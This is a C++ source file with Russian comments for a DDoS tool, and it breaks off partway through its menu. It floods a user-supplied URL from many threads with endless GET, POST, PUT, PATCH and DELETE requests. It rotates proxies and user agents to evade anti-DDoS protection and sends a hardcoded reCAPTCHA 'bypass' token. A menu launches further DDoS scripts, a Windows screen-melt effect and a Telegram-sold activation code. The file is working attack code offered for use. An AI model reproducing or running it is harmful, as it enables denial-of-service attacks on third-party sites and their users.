#include <clocale>
#include <ctime>
#include <fstream>
#include <iostream>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <exception>
#include <cmath>
#include <iomanip>

#if _WIN64
#include <Windows.h>
#include <mmsystem.h>
#pragma comment(lib, "winmm")
#endif

#include "cpr/cpr.h"

class WrongCountThreads : public std::exception {
 public:
  const char *what() const noexcept override {
    return "Exception: Wrong count of threads\n";
  }
};

class WrongLink : public std::exception {
 public:
  const char *what() const noexcept override {
    return "Exception: Wrong link\n";
  }
};

struct TypeThreading {  //вектора потоков запросов на сайт
  std::vector<std::thread> threadsPost;
  std::vector<std::thread> threadsGet;
  std::vector<std::thread> threadsPatch;
  std::vector<std::thread> threadsPut;
  std::vector<std::thread> threadsDelete;
} typeofThread;

struct TypeMutex {  //спецификаторы доступа к векторам потоков
  std::mutex threads_post_access;
  std::mutex threads_get_access;
  std::mutex threads_patch_access;
  std::mutex threads_put_access;
  std::mutex threads_delete_access;
} typeofMutex;

struct StatisticsUser {  //информация о выборе пользователя
  bool isHttp = false;
  bool isSwim = false;
  bool isPyDdos = false;
  bool isBen = false;
  bool isGoldengram = false;
  bool isProxy = false;
  bool isUserAgent = false;
  bool isRecapcha = false;
  bool isGet = false;
  bool isPost = false;
  bool isPatch = false;
  bool isPut = false;
  bool isDelete = false;
} statistic;

inline std::string __getRandomUserAgent() {  //получение случайного User-Agent
  std::ifstream in("users.txt");  //файл: users.txt

  auto __findCountOfStrings = [](std::string path) {   //принимает относительный путь файла
    char buffer[1024];
    int counter = 0;
    std::ifstream file(path);
    while (!file.eof()) {
      file.getline(buffer, 1024, '\n');
      counter++;
    }
    file.close();
    return counter;
  };

  int countStrings = __findCountOfStrings("users.txt");
  int randomString_index = std::rand() % countStrings + 1;
  std::string resultUserAgent{};
  for (int i = 0; i < randomString_index; i++) {
    getline(in, resultUserAgent);
  }
  in.close();
  return resultUserAgent;
}

inline std::string __getRandomProxy() {  //получение случайного сервера прокси
  std::ifstream in("proxies.txt");  //файл: proxies.txt

  auto __findCountOfStrings =
      [](std::string path) {  //принимает относительный путь файла
        char buffer[1024];
        int counter = 0;
        std::ifstream file(path);
        while (!file.eof()) {
          file.getline(buffer, 1024, '\n');
          counter++;
        }
        file.close();
        return counter;
      };

  int countStrings = __findCountOfStrings("proxies.txt");
  int randomString_index = std::rand() % countStrings + 1;
  std::string resultProxie{};
  for (int i = 0; i < randomString_index; i++) {
    getline(in, resultProxie);
  }
  in.close();
  return resultProxie;
}

int countThreads = 0;
std::string site = "";

class Attack {
 public:
  virtual inline void sendResponse() const = 0;
};

inline void setSite() {  //ввод ссылки на сайт и количества воркеров (потоков)
  if (statistic.isHttp == true) {
      cpr::Response r;
      do {
        try {
          std::cout << "Введите ссылку на сайт:" << std::endl;
          std::cout << "Например: https://futsafe.ru/ или futsafe.ru"
                    << std::endl;
          std::cout << ">>> ";
          std::cin >> site;
          std::cout << "Обработка..." << std::endl;

          r = cpr::Get(cpr::Url(site));
          if (r.status_code != 200) throw WrongLink();
        } catch (const WrongLink &x) {
          std::cerr << x.what();
        }
      } while (r.status_code != 200);
  }

  if (statistic.isHttp == true) {
    do {
      try {
        std::cout << "Введите количество воркеров:" << std::endl;
        std::cout << "Например: 666" << std::endl;
        std::cout << ">>> ";
        std::cin >> countThreads;

        if (countThreads <= 0) throw WrongCountThreads();
      } catch (const WrongCountThreads &x) {
        std::cerr << x.what();
      }
    } while (countThreads <= 0);
  }

  if (statistic.isHttp == true) {  //проверяем информацию, которую указал
                                   //пользователь и создаем нужные нам потоки
    if (statistic.isPost == true) {
      typeofMutex.threads_post_access.lock();
      typeofThread.threadsPost.resize(countThreads);
      typeofMutex.threads_post_access.unlock();
    }

    if (statistic.isGet == true) {
      typeofMutex.threads_get_access.lock();
      typeofThread.threadsGet.resize(countThreads);
      typeofMutex.threads_get_access.unlock();
    }

    if (statistic.isPatch == true) {
      typeofMutex.threads_patch_access.lock();
      typeofThread.threadsPatch.resize(countThreads);
      typeofMutex.threads_patch_access.unlock();
    }

    if (statistic.isPut == true) {
      typeofMutex.threads_put_access.lock();
      typeofThread.threadsPut.resize(countThreads);
      typeofMutex.threads_put_access.unlock();
    }

    if (statistic.isDelete == true) {
      typeofMutex.threads_delete_access.lock();
      typeofThread.threadsDelete.resize(countThreads);
      typeofMutex.threads_delete_access.unlock();
    }
  }
}

class Post : public Attack {
 public:
  virtual inline void sendResponse() const override {  //отправка POST запроса
    if (statistic.isUserAgent == true && statistic.isProxy == true) {
      cpr::Response postResponse = cpr::Post(
          cpr::Url(site), cpr::Header({{"user-agent", __getRandomUserAgent()}}),
          cpr::Proxies{{"http", __getRandomProxy()}});
      if (postResponse.status_code == 200) {
        std::cout << "Send POST response with user agents and with proxy [+]"
                  << std::endl;
      }
    } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
      cpr::Response postResponse =
          cpr::Post(cpr::Url(site),
                    cpr::Header({{"user-agent", __getRandomUserAgent()}}));
      if (postResponse.status_code == 200) {
        std::cout << "Send POST response with user agents and without proxy [+]"
                  << std::endl;
      }
    } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
      cpr::Response postResponse =
          cpr::Post(cpr::Url(site), cpr::Proxies{{"http", __getRandomProxy()}});
      if (postResponse.status_code == 200) {
        std::cout << "Send POST response without user agents and with proxy [+]"
                  << std::endl;
      }
    } else {
      cpr::Response postResponse = cpr::Post(cpr::Url(site));
      if (postResponse.status_code == 200) {
        std::cout << "Send POST response without proxy and user agents [+]"
                  << std::endl;
      }
    }

    if (statistic.isRecapcha == true) {
      cpr::Response postResponse = cpr::Post(
          cpr::Url(site),
          cpr::Header{
              {"g-recaptcha-response",
               "03AGdBq27TksddpLqKjvbxhgOOrgT1Qgi2TtJ4_"
               "g7tIaz1hX5JrMLXcj3fmLMmVkTf60qldGuXMOzp8v1wXHA4xH6-"
               "JPKdsXPyucWNvx53jsy8DbyvuZLQsTjWVEB4GvGDPVi3So8NDU7YzH5iStnB"
               "izp3ZDxABucAHmASB8CmBVcSM6-XBtUzCb4Ub_"
               "VKUiiSAATgsHzTYi36OtUj-4KcdN3oDZL2yd_"
               "Phkz5KRenCQ1BviwKsUMIelNhZGdEo4SgqU6KzFBZG2rA7dUJZ719qQxSllg"
               "IrY7swyEnhjX284pfz0-ieapoRpRYoeUEXrlARUWaKw27-39rbCHrDxl2W_-"
               "6hEfJPaurFYWj7O5npClbEGnE-"
               "0XVEtsgYwkncrbj7mTZg3hvt5jz1fxIUV0XD6ji4whU197JcP_dF_"
               "FF3ZGboGn9nvKGa5v35Tnt3io_4lEDF63RT318"}});
    }
  }
};

 class Get : public Attack {
 public:
   inline virtual void sendResponse() const override {  //отправка GET запроса
     if (statistic.isUserAgent == true && statistic.isProxy == true) {
       cpr::Response getResponse =
           cpr::Get(cpr::Url(site),
                    cpr::Header({{"user-agent", __getRandomUserAgent()}}),
                    cpr::Proxies{{"http", __getRandomProxy()}});
       if (getResponse.status_code == 200) {
         std::cout << "Send GET response with user agents and with proxy [+]"
                   << std::endl;
       }
     } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
       cpr::Response getResponse =
           cpr::Get(cpr::Url(site),
                    cpr::Header({{"user-agent", __getRandomUserAgent()}}));
       if (getResponse.status_code == 200) {
         std::cout << "Send GET response with user agents and without proxy [+]"
                   << std::endl;
       }
     } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
       cpr::Response getResponse =
           cpr::Get(cpr::Url(site), cpr::Proxies{{"http", __getRandomProxy()}});
       if (getResponse.status_code == 200) {
         std::cout << "Send GET response without user agents and with proxy [+]"
                   << std::endl;
       }
     } else {
       cpr::Response getResponse = cpr::Get(cpr::Url(site));
       if (getResponse.status_code == 200) {
         std::cout << "Send GET response without proxy and user agents [+]"
                   << std::endl;
       }
     }

     if (statistic.isRecapcha == true) {
       cpr::Response getResponse = cpr::Get(
           cpr::Url(site),
           cpr::Header{
               {"g-recaptcha-response",
                "03AGdBq27TksddpLqKjvbxhgOOrgT1Qgi2TtJ4_"
                "g7tIaz1hX5JrMLXcj3fmLMmVkTf60qldGuXMOzp8v1wXHA4xH6-"
                "JPKdsXPyucWNvx53jsy8DbyvuZLQsTjWVEB4GvGDPVi3So8NDU7YzH5iStnB"
                "izp3ZDxABucAHmASB8CmBVcSM6-XBtUzCb4Ub_"
                "VKUiiSAATgsHzTYi36OtUj-4KcdN3oDZL2yd_"
                "Phkz5KRenCQ1BviwKsUMIelNhZGdEo4SgqU6KzFBZG2rA7dUJZ719qQxSllg"
                "IrY7swyEnhjX284pfz0-ieapoRpRYoeUEXrlARUWaKw27-39rbCHrDxl2W_-"
                "6hEfJPaurFYWj7O5npClbEGnE-"
                "0XVEtsgYwkncrbj7mTZg3hvt5jz1fxIUV0XD6ji4whU197JcP_dF_"
                "FF3ZGboGn9nvKGa5v35Tnt3io_4lEDF63RT318"}});
       std::cout << "Отправлен Get запрос с обходом рекапчи [+]" << std::endl;
     }
   }
 };

 class Put : public Attack {
  public:
   inline virtual void sendResponse() const override {  //отправка PUT запроса
     if (statistic.isUserAgent == true && statistic.isProxy == true) {
       cpr::Response putResponse =
           cpr::Put(cpr::Url(site),
                    cpr::Header({{"user-agent", __getRandomUserAgent()}}),
                    cpr::Proxies{{"http", __getRandomProxy()}});
       if (putResponse.status_code == 200) {
         std::cout << "Send PUT response with user agents and with proxy [+]"
                   << std::endl;
       }
     } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
       cpr::Response putResponse =
           cpr::Put(cpr::Url(site),
                    cpr::Header({{"user-agent", __getRandomUserAgent()}}));
       if (putResponse.status_code == 200) {
         std::cout << "Send PUT response with user agents and without proxy [+]"
                   << std::endl;
       }
     } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
       cpr::Response putResponse =
           cpr::Put(cpr::Url(site), cpr::Proxies{{"http", __getRandomProxy()}});
       if (putResponse.status_code == 200) {
         std::cout << "Send PUT response without user agents and with proxy [+]"
                   << std::endl;
       }
     } else {
       cpr::Response putResponse = cpr::Put(cpr::Url(site));
       if (putResponse.status_code == 200) {
         std::cout << "Send PUT response without proxy and user agents [+]"
                   << std::endl;
       }
     }

     if (statistic.isRecapcha == true) {
       cpr::Response putResponse = cpr::Put(
           cpr::Url(site),
           cpr::Header{
               {"g-recaptcha-response",
                "03AGdBq27TksddpLqKjvbxhgOOrgT1Qgi2TtJ4_"
                "g7tIaz1hX5JrMLXcj3fmLMmVkTf60qldGuXMOzp8v1wXHA4xH6-"
                "JPKdsXPyucWNvx53jsy8DbyvuZLQsTjWVEB4GvGDPVi3So8NDU7YzH5iStnB"
                "izp3ZDxABucAHmASB8CmBVcSM6-XBtUzCb4Ub_"
                "VKUiiSAATgsHzTYi36OtUj-4KcdN3oDZL2yd_"
                "Phkz5KRenCQ1BviwKsUMIelNhZGdEo4SgqU6KzFBZG2rA7dUJZ719qQxSllg"
                "IrY7swyEnhjX284pfz0-ieapoRpRYoeUEXrlARUWaKw27-39rbCHrDxl2W_-"
                "6hEfJPaurFYWj7O5npClbEGnE-"
                "0XVEtsgYwkncrbj7mTZg3hvt5jz1fxIUV0XD6ji4whU197JcP_dF_"
                "FF3ZGboGn9nvKGa5v35Tnt3io_4lEDF63RT318"}});
       std::cout << "Отправлен Put запрос с обходом рекапчи [+]" << std::endl;
     }
   }
 };

   class Patch : public Attack {
    public:
     inline virtual void sendResponse() const override {  //отправка PATCH запроса
       if (statistic.isUserAgent == true && statistic.isProxy == true) {
         cpr::Response patchResponse =
             cpr::Patch(cpr::Url(site),
                        cpr::Header({{"user-agent", __getRandomUserAgent()}}),
                        cpr::Proxies{{"http", __getRandomProxy()}});
         if (patchResponse.status_code == 200) {
           std::cout
               << "Send PATCH response with user agents and with proxy [+]"
               << std::endl;
         }
       } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
         cpr::Response patchResponse =
             cpr::Patch(cpr::Url(site),
                        cpr::Header({{"user-agent", __getRandomUserAgent()}}));
         if (patchResponse.status_code == 200) {
           std::cout
               << "Send PATCH response with user agents and without proxy [+]"
               << std::endl;
         }
       } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
         cpr::Response patchResponse = cpr::Patch(
             cpr::Url(site), cpr::Proxies{{"http", __getRandomProxy()}});
         if (patchResponse.status_code == 200) {
           std::cout
               << "Send PATCH response without user agents and with proxy [+]"
               << std::endl;
         }
       } else {
         cpr::Response patchResponse = cpr::Patch(cpr::Url(site));
         if (patchResponse.status_code == 200) {
           std::cout << "Send PATCH response without proxy and user agents [+]"
                     << std::endl;
         }
       }

       if (statistic.isRecapcha == true) {
         cpr::Response patchResponse = cpr::Patch(
             cpr::Url(site),
             cpr::Header{
                 {"g-recaptcha-response",
                  "03AGdBq27TksddpLqKjvbxhgOOrgT1Qgi2TtJ4_"
                  "g7tIaz1hX5JrMLXcj3fmLMmVkTf60qldGuXMOzp8v1wXHA4xH6-"
                  "JPKdsXPyucWNvx53jsy8DbyvuZLQsTjWVEB4GvGDPVi3So8NDU7YzH5iStnB"
                  "izp3ZDxABucAHmASB8CmBVcSM6-XBtUzCb4Ub_"
                  "VKUiiSAATgsHzTYi36OtUj-4KcdN3oDZL2yd_"
                  "Phkz5KRenCQ1BviwKsUMIelNhZGdEo4SgqU6KzFBZG2rA7dUJZ719qQxSllg"
                  "IrY7swyEnhjX284pfz0-ieapoRpRYoeUEXrlARUWaKw27-39rbCHrDxl2W_-"
                  "6hEfJPaurFYWj7O5npClbEGnE-"
                  "0XVEtsgYwkncrbj7mTZg3hvt5jz1fxIUV0XD6ji4whU197JcP_dF_"
                  "FF3ZGboGn9nvKGa5v35Tnt3io_4lEDF63RT318"}});
         std::cout << "Отправлен Patch запрос с обходом рекапчи [+]" << std::endl;
       }
     }
   };

   class Delete : public Attack {
    public:
     inline virtual void sendResponse() const override {  //отправка DELETE запроса
       if (statistic.isUserAgent == true && statistic.isProxy == true) {
         cpr::Response deleteResponse =
             cpr::Delete(cpr::Url(site),
                         cpr::Header({{"user-agent", __getRandomUserAgent()}}),
                         cpr::Proxies{{"http", __getRandomProxy()}});
         if (deleteResponse.status_code == 200) {
           std::cout
               << "Send DELETE response with user agents and with proxy [+]"
               << std::endl;
         }
       } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
         cpr::Response deleteResponse =
             cpr::Delete(cpr::Url(site),
                         cpr::Header({{"user-agent", __getRandomUserAgent()}}));
         if (deleteResponse.status_code == 200) {
           std::cout
               << "Send DELETE response with user agents and without proxy [+]"
               << std::endl;
         }
       } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
         cpr::Response deleteResponse = cpr::Delete(
             cpr::Url(site), cpr::Proxies{{"http", __getRandomProxy()}});
         if (deleteResponse.status_code == 200) {
           std::cout
               << "Send DELETE response without user agents and with proxy [+]"
               << std::endl;
         }
       } else {
         cpr::Response deleteResponse = cpr::Delete(cpr::Url(site));
         if (deleteResponse.status_code == 200) {
           std::cout << "Send DELETE response without proxy and user agents [+]"
                     << std::endl;
         }
       }

       if (statistic.isRecapcha == true) {
         cpr::Response deleteResponse = cpr::Delete(
             cpr::Url(site),
             cpr::Header{
                 {"g-recaptcha-response",
                  "03AGdBq27TksddpLqKjvbxhgOOrgT1Qgi2TtJ4_"
                  "g7tIaz1hX5JrMLXcj3fmLMmVkTf60qldGuXMOzp8v1wXHA4xH6-"
                  "JPKdsXPyucWNvx53jsy8DbyvuZLQsTjWVEB4GvGDPVi3So8NDU7YzH5iStnB"
                  "izp3ZDxABucAHmASB8CmBVcSM6-XBtUzCb4Ub_"
                  "VKUiiSAATgsHzTYi36OtUj-4KcdN3oDZL2yd_"
                  "Phkz5KRenCQ1BviwKsUMIelNhZGdEo4SgqU6KzFBZG2rA7dUJZ719qQxSllg"
                  "IrY7swyEnhjX284pfz0-ieapoRpRYoeUEXrlARUWaKw27-39rbCHrDxl2W_-"
                  "6hEfJPaurFYWj7O5npClbEGnE-"
                  "0XVEtsgYwkncrbj7mTZg3hvt5jz1fxIUV0XD6ji4whU197JcP_dF_"
                  "FF3ZGboGn9nvKGa5v35Tnt3io_4lEDF63RT318"}});
         std::cout << "Отправлен Delete запрос с обходом рекапчи [+]" << std::endl;
       }
     }
   };

   /* функции для проявления многопоточности*/

   inline void dosPost(std::shared_ptr<Post> post) {
     while (true) {
       post->sendResponse();
     }
   }

   inline void dosGet(std::shared_ptr<Get> get) {
     while (true) {
       get->sendResponse();
     }
   }

   inline void dosPut(std::shared_ptr<Put> put) {
     while (true) {
       put->sendResponse();
     }
   }

   inline void dosDelete(std::shared_ptr<Delete> delete_) {
     while (true) {
       delete_->sendResponse();
     }
   }

   inline void dosPatch(std::shared_ptr<Patch> patch) {
     while (true) {
       patch->sendResponse();
     }
   }

  int screen_width = 0;
  int screen_height = 0;
  int distance = 100;

  #if _WIN64
  LRESULT CALLBACK Melt(HWND hwnd, UINT msg, WPARAM w_param, LPARAM l_param) {
    switch (msg) {
      case WM_CREATE: {
        HDC desktop = GetDC(HWND_DESKTOP);
        HDC window = GetDC(hwnd);
        BitBlt(window, 0, 0, screen_width, screen_height, desktop, 0, 0,
               SRCCOPY);
        ReleaseDC(hwnd, window);
        ReleaseDC(HWND_DESKTOP, desktop);
        SetTimer(hwnd, 0, distance, 0);
        ShowWindow(hwnd, SW_SHOW);
        break;
      }
      case WM_PAINT: {
        ValidateRect(hwnd, 0);
        break;
      }
      case WM_TIMER: {
        HDC window_ = GetDC(hwnd);
        int x = (std::rand() % screen_width) - (200 / 2);
        int y = std::rand() % 15;
        int width_ = std::rand() % 200;
        BitBlt(window_, x, y, width_, screen_height, window_, x, 0, SRCCOPY);
        ReleaseDC(hwnd, window_);
        break;
      }
      case WM_DESTROY: {
        KillTimer(hwnd, 0);
        PostQuitMessage(0);
        break;
      }
    }

    return DefWindowProc(hwnd, msg, w_param, l_param);
  }
  #endif

   enum class CommandType {
    HTTP = 1,
    SWIM,
    PY_DDOS,
    PY_BEN,
    GOLDENGRAM
  };  //выбор метода атаки

   enum class HttpResponseType {
     GET = 1,
     POST,
     PUT,
     r_DELETE,
     PATCH,
     EXIT
   };  //выбор типа запроса на сайт

   enum class AttackType {
     PROXY = 1,
     USER_AGENT,
     RECAPCHA_BYPASS,
     EXIT
   };  //выбор использования прокси / User-Agents

   inline void music() { system("python music.py"); }

   inline void gang_shit() {
     setSite();
     /* присоединяем потоки к выполнению программы */

     std::shared_ptr<Post> post = std::make_shared<Post>();
     if (statistic.isPost == true) {
       typeofMutex.threads_post_access.lock();
       for (int i = 0; i < typeofThread.threadsPost.size(); i++) {
         typeofThread.threadsPost[i] = std::thread(dosPost, post);
       }
       typeofMutex.threads_post_access.unlock();
     }

     std::shared_ptr<Get> get = std::make_shared<Get>();
     if (statistic.isGet == true) {
       typeofMutex.threads_get_access.lock();
       for (int i = 0; i < typeofThread.threadsGet.size(); i++) {
         typeofThread.threadsGet[i] = std::thread(dosGet, get);
       }
       typeofMutex.threads_get_access.unlock();
     }

     std::shared_ptr<Patch> patch = std::make_shared<Patch>();
     if (statistic.isPatch == true) {
       typeofMutex.threads_patch_access.lock();
       for (int i = 0; i < typeofThread.threadsPatch.size(); i++) {
         typeofThread.threadsPatch[i] = std::thread(dosPatch, patch);
       }
       typeofMutex.threads_patch_access.unlock();
     }

     std::shared_ptr<Put> put = std::make_shared<Put>();
     if (statistic.isPut == true) {
       typeofMutex.threads_put_access.lock();
       for (int i = 0; i < typeofThread.threadsPut.size(); i++) {
         typeofThread.threadsPut[i] = std::thread(dosPut, put);
       }
       typeofMutex.threads_put_access.unlock();
     }

     std::shared_ptr<Delete> delete_ = std::make_shared<Delete>();
     if (statistic.isDelete == true) {
       typeofMutex.threads_delete_access.lock();
       for (int i = 0; i < typeofThread.threadsDelete.size(); i++) {
         typeofThread.threadsDelete[i] = std::thread(dosDelete, delete_);
       }
       typeofMutex.threads_delete_access.unlock();
     }

     if (statistic.isPost == true) {
       typeofMutex.threads_post_access.lock();
       for (int i = 0; i < typeofThread.threadsPost.size(); i++) {
         typeofThread.threadsPost[i].join();
       }
       typeofMutex.threads_post_access.unlock();
     }

     if (statistic.isGet == true) {
       typeofMutex.threads_get_access.lock();
       for (int i = 0; i < typeofThread.threadsGet.size(); i++) {
         typeofThread.threadsGet[i].join();
       }
       typeofMutex.threads_get_access.unlock();
     }

     if (statistic.isPut == true) {
       typeofMutex.threads_put_access.lock();
       for (int i = 0; i < typeofThread.threadsPut.size(); i++) {
         typeofThread.threadsPut[i].join();
       }
       typeofMutex.threads_put_access.unlock();
     }

     if (statistic.isDelete == true) {
       typeofMutex.threads_delete_access.lock();
       for (int i = 0; i < typeofThread.threadsDelete.size(); i++) {
         typeofThread.threadsDelete[i].join();
       }
       typeofMutex.threads_delete_access.unlock();
     }

     if (statistic.isPatch == true) {
       typeofMutex.threads_patch_access.lock();
       for (int i = 0; i < typeofThread.threadsPatch.size(); i++) {
         typeofThread.threadsPatch[i].join();
       }
       typeofMutex.threads_patch_access.unlock();
     }
   }

#if _WIN64
   inline void singing_bloknot() {
     std::this_thread::sleep_for(std::chrono::seconds(1));
     WCHAR text[] = {L"Знаешь почему?\nЯ богатый молодой\nЗнаешь почему?\n10 лямов на ладонь\nЗнаешь почему?\nМой секрет п*здец простой\nЗнаешь почему?\nПросто яделаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nУлетел, как только купил дом\nПродал все битки и купил Ton\nС*ку снял и заплатил криптой\nПали в ТГ канале\nЧе с ней было потом\nВсе мои родные\nБогатые и здоровые\nНа мне тишка за сотку\nИ платина — я как Дора\nЯ вчера вино пил\nНа вилле у Паши Дурова\nОн просил передать вам\nЧто стену он не вернет уже\nCadillac, McLarenМерседес купе и Porsche\nЯ бы купил больше\nНо некуда ставить больше\nУ меня нет цели\nТут все гораздо проще\nЯ двигаюсь п*здато\nЧтоб были крутые строчки\nХей, посмотри\nМои цепи и часы\nАвтопарк ценой лям баксов\nВсе в России взаперти\nНу и пох*й\nВсе равно я собирался тр*хать мир\nБ*я, не буду больше жаловаться\nНа скучную жизнь (честно)\nЯ качусь по миру\nСо мной два чемодана\nВ одном моя студийка\nВ другом цветная бумага\nГоворят, мой рэп – не правда\nНо это все не правда\nВедь я пел «когда-нибудь уйду»\nИ съе*ался\nАртист года второй год подряд\nЭто уже не весело\nС федералами проблемы\nПрямо как у рэперов\nЯ с любовью шлю домой\nНа родину открытки\nЗа шанс начать все заново\nРоссиюшке спасибо (спасибо)\nДва ляма баксов\nНо я не про альбом\nА про то, что в мире стало больше\nОдним пацаном\nОн будет бегать и гулять\nМне от этого зае*ись\nИлюха – как русский рэп\nЯ подарил ему жизнь\nЗнаешь почему?\nЯ богатый молодой\nЗнаешь почему?\n10 лямов на ладонь\nЗнаешь почему?\nМой секрет п*здец простой\nЗнаешь почему?\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу\nПросто я делаю, что хочу"};

     STARTUPINFOW si = {0};
     PROCESS_INFORMATION pi = {0};
     CreateProcessW(L"c:\\windows\\notepad.exe", NULL, 0, 0, 0, 0, 0, 0, &si,
                    &pi);

     Sleep(70);

     HWND hNotepad = FindWindowW(L"Notepad", 0);
     HWND edit = FindWindowExW(hNotepad, 0, L"Edit", 0);

     int len = wcslen(text);
     for (int i = 0; i < len; i++) {
       Sleep(70);
       SendMessageW(edit, WM_CHAR, (WPARAM)text[i], 0);
     }
   }

#endif


#if _WIN64
   int APIENTRY main(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int showCmd) {
     std::srand(std::time(nullptr));
     setlocale(LC_ALL, "rus");
     std::ifstream file_f("C:\\Windows\\System32\\sysmm_v.txt");
     std::string line = "";
     int num_state = 0;
     while (getline(file_f, line)) {
       num_state = std::stoi(line);
     }
     file_f.close();
     if (num_state > 0) goto cheat_code;
     long double code_1 = std::rand() % 800000 + 10000;
     double code_2 = std::rand() % 800 + 100;
     std::cout << "Отправьте эти коды в телеграм!" << std::endl;
     std::cout << "----------PRIVATE KEY----------" << std::endl;
     std::cout << "----------" << code_1 << "----------" << std::endl;
     std::cout << "----------" << code_2 << "----------" << std::endl;
     std::cout << "----------------------------------------" << std::endl;
     std::cout << "Введите код, который вам выдали: ";
     long double pass = 0;
     std::cin >> pass;
     system("pause");
     if (pass == (int)(code_1 * code_2 * 0.13)) {
     cheat_code:
       system("cls");
       std::ofstream file("C:\\Windows\\System32\\sysmm_v.txt");
       int a = 1;
       file << a;
       file.close();
#if _WIN64
       system("color 4");
#endif
       std::cout << "Введите тип атаки:" << std::endl;
       std::cout << static_cast<int>(CommandType::HTTP)
                 << "# HTTP атака (по Url)  //осторожно. это смертельно." << std::endl;
       std::cout << static_cast<int>(CommandType::SWIM)
                 << "# Расслабься, друг. Введи 2, чтобы поплавать."
                 << std::endl;
       std::cout << static_cast<int>(CommandType::PY_DDOS) << "# CFB отправка"
                 << std::endl;
       std::cout << static_cast<int>(CommandType::PY_BEN) << "# Говорящий Бен"
                 << std::endl;
       std::cout << static_cast<int>(CommandType::GOLDENGRAM) << "# Goldengram (ddos)"
                 << std::endl;

       int *command = new int;
       std::cout << ">>> ";
       std::cin >> *command;

       if (*command < static_cast<int>(CommandType::HTTP) ||
           *command > static_cast<int>(CommandType::GOLDENGRAM)) {
         do {
           std::cout << "Введены неверные данные! Попробуйте еще раз!"
                     << std::endl;
           std::cin >> *command;
         } while (*command < static_cast<int>(CommandType::HTTP));
       }

       if (*command == static_cast<int>(CommandType::HTTP))
         statistic.isHttp = true;
       else if (*command == static_cast<int>(CommandType::SWIM))
         statistic.isSwim = true;
       else if (*command == static_cast<int>(CommandType::PY_DDOS))
         statistic.isPyDdos = true;
       else if (*command == static_cast<int>(CommandType::PY_BEN))
         statistic.isBen = true;
       else if (*command == static_cast<int>(CommandType::GOLDENGRAM))
         statistic.isGoldengram = true;
       delete command;

       if (statistic.isHttp == true) {
         std::cout << "Введите типы запросов которые вы будете "
                      "отправлять:(введите цифру)"
                   << std::endl;
         std::cout << static_cast<int>(HttpResponseType::GET) << "# Get запросы"
                   << std::endl;
         std::cout << static_cast<int>(HttpResponseType::POST)
                   << "# Post запросы" << std::endl;
         std::cout << static_cast<int>(HttpResponseType::PUT) << "# Put запросы"
                   << std::endl;
         std::cout << static_cast<int>(HttpResponseType::r_DELETE)
                   << "# Delete запросы" << std::endl;
         std::cout << static_cast<int>(HttpResponseType::PATCH)
                   << "# Patch запросы" << std::endl;
         std::cout << static_cast<int>(HttpResponseType::EXIT)
                   << "# Закончить выбор и перейти к атаке" << std::endl;

         int *responseType = new int;
         *responseType = 0;

         while (*responseType != static_cast<int>(HttpResponseType::EXIT)) {
           std::cout << ">>> ";
           std::cin >> *responseType;

           if (*responseType < static_cast<int>(HttpResponseType::GET) ||
               *responseType > static_cast<int>(HttpResponseType::EXIT)) {
             do {
               std::cout << "Введены неверные символы! Попробуйте еще раз:"
                         << std::endl;
               std::cout << ">>> ";
               std::cin >> *responseType;
             } while (*responseType < static_cast<int>(HttpResponseType::GET) ||
                      *responseType > static_cast<int>(HttpResponseType::EXIT));
           }

           switch (*responseType) {
             case static_cast<int>(HttpResponseType::GET):
               std::cout << "Отправка Get запросов включена!" << std::endl;
               statistic.isGet = true;
               break;
             case static_cast<int>(HttpResponseType::POST):
               std::cout << "Отправка Post запросов включена!" << std::endl;
               statistic.isPost = true;
               break;
             case static_cast<int>(HttpResponseType::PUT):
               std::cout << "Отправка Put запросов включена!" << std::endl;
               statistic.isPut = true;
               break;
             case static_cast<int>(HttpResponseType::r_DELETE):
               std::cout << "Отправка Delete запросов включена!" << std::endl;
               statistic.isDelete = true;
               break;
             case static_cast<int>(HttpResponseType::PATCH):
               std::cout << "Отправка Patch запросов включена!" << std::endl;
               statistic.isPatch = true;
               break;
           }
         }

         delete responseType;
       } else if (statistic.isSwim == true) {
#if _WIN64
         screen_width = GetSystemMetrics(SM_CXSCREEN);
         screen_height = GetSystemMetrics(SM_CYSCREEN);
         AllocConsole();

         WNDCLASS window_class_ = {
             0, Melt, 0,         0, inst, 0, LoadCursorW(0, (LPCWSTR)IDC_ARROW),
             0, 0,    "Swimming"};

         if (RegisterClass(&window_class_)) {
           HWND hwnd = CreateWindowExA(WS_EX_TOPMOST, "Swimming", 0, WS_POPUP,
                                       0, 0, screen_width, screen_height,
                                       HWND_DESKTOP, 0, inst, 0);

           if (hwnd) {
             srand(GetTickCount64());
             MSG msg_ = {0};
             while (msg_.message != WM_QUIT) {
               if (PeekMessage(&msg_, 0, 0, 0, PM_REMOVE)) {
                 TranslateMessage(&msg_);
                 DispatchMessage(&msg_);
               }
             }
           }
         }
#endif
       } else if (statistic.isPyDdos == true) {
         system("python cfb.py");
       } else if (statistic.isBen == true) {
         system("python ben.py");
       } else if (statistic.isGoldengram == true) {
         system("python goldengram.py");
       }

       if (statistic.isHttp == true) {
         MessageBox(
             0,
             "Внимание! Чтобы добавить свои юзер агенты, нужно поместить их в "
             "файл users.txt. Чтобы добавить прокси, нужно поместить их в файл "
             "proxies.txt. На практике они замедляют отправку запросов. Но "
             "иногда с их помощью можно обойти анти DDOS защиты.",
             "Правила пользования ерундой.", 0);

         std::cout << "Введите будете ли вы использовать прокси или юзер "
                      "агенты:(1 или 2)"
                   << std::endl;
         std::cout
             << static_cast<int>(AttackType::PROXY)
             << "# Включить прокси (можете добавить свои в файл proxies.txt)"
             << std::endl;
         std::cout
             << static_cast<int>(AttackType::USER_AGENT)
             << "# Включить Рандомизатор юзер агентов (можете добавить свои в "
                "файл users.txt)"
             << std::endl;
